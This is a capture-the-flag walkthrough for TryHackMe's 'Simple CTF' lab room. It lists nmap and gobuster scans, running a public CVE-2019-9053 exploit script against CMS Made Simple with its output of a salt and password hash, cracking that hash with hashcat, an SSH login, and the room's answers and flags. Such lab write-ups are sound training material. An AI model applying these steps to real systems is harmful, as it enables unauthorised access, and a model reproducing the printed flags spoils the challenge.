## Simple CTF | TryHackMe

This is the link for the room [Simple CTF](https://tryhackme.com/room/easyctf)

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png" width="500px" align="center">

---
How many services are running under port 1000?

**Answer: 2**

`nmap -sC -sV -p- -T4 [MACHINE_IP]`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

<img src="https://user-images.githubusercontent.com/67650329/189660269-6d264b85-2fbe-424e-b42e-f7b0c03982be.png" width="500px" align="center">

What is running on the higher port?

**Answer: ssh**

What's the CVE you're using against the application?

**Answer: CVE-2019-9053**

`gobuster dir -u 10.10.186.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -n`

<img src="https://user-images.githubusercontent.com/67650329/189661354-17a78b0e-c38c-4343-8a96-f1bb51cf6978.png" width="500px" align="center">

Go to the website and see the version

<img src="https://user-images.githubusercontent.com/67650329/189661682-00831dfc-7a81-4fe3-b73d-c996903928e9.png" width="500px" align="center">

Search on your search engine `CMS Made Simple 2.2.8 CVE`

<img src="https://user-images.githubusercontent.com/67650329/189662143-9df708f0-c8ed-4b19-8eac-214aa08071b4.png" width="500px" align="center">

What's the password?

**Answer: Secret**

`python3 46635.py -u [MACHINE_IP]`

[+] Salt for password found: 1dac0d92e9fa6bb2

[+] Username found: mitch

[+] Email found: admin@admin.com

[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

Use Hashcat to see the password user mitch

`hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt.gz`

Where can you login with the details obtained?

**Answer: ssh**

`ssh mitch@[MACHINE_IP] -p 2222`

What's the user flag?

**Answer: G00d j0b, keep up!**

<img src="https://github.com/nieshakenzie/TryHackMe/assets/67650329/affeb5e8-1e80-49bf-9baa-7abb0ba0cfb1" width="500px" align="center">

Is there any other user in the home directory? What's its name?

**Answer: sunbath**

What can you leverage to spawn a privileged shell?

**Answer: vim**

What's the root flag?

**Answer: W3ll d0n3. You made it!**

---
